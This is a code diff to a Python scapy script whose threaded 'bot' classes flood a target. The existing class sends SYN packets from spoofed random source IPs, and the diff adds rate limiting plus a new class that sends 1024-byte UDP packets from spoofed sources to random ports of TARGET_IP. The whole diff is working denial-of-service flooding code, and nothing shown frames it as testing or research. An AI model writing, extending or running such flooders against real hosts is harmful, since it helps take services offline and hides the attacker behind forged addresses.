@@ -1,5 +1,5 @@
 import time, threading
-from scapy.layers.inet import IP, TCP
+from scapy.layers.inet import IP, TCP, UDP
 from scapy.sendrecv import send
 from scapy.volatile import RandIP, RandShort
 from pathlib import Path
@@ -28,6 +28,33 @@ class L4SYNBot(threading.Thread):
                          TCP(dport=self.target_port, sport=RandShort(), flags="S")
                 send(packet, verbose=0)
                 self.local_packets_sent += 1
+                if self.pps:
+                    time.sleep(1.0/self.pps)
+            except Exception as e:
+                self.local_errors_count += 1
+
+
+class L4UDPBot(threading.Thread):
+    def __init__(self, stop_time: int, num: int, pps: int | None):
+        super().__init__()
+        self.target_ip = TARGET_IP
+        self.stop_time = stop_time
+        self.pps = pps
+        self.name = f"bot{num}"
+        self.local_packets_sent = 0
+        self.local_errors_count = 0
+        self.local_bytes_send = 0
+
+    def run(self):
+        while time.time() < self.stop_time:
+            try:
+                payload = b'X' * 1024
+                packet = IP(dst=self.target_ip, src=RandIP()) / \
+                    UDP(dport=RandShort(), sport=RandShort()) / \
+                    payload
+                send(packet, verbose=0)
+                self.local_packets_sent += 1
+                self.local_bytes_send += len(packet)
                 if self.pps:
                     time.sleep(1.0/self.pps)
             except Exception as e:
